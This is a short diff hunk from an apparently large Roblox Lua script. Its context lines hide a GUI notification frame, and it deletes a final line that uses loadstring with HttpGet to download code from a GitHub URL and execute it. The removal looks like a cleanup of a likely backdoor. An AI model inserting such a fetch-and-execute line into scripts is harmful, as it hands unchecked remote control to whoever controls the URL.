@@ -13162,5 +13162,3 @@ function Destroy(guiObject)
 end
 wait(0.1)
 game:GetService("CoreGui").RobloxGui.NotificationFrame.Visible = false
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/asd"))();
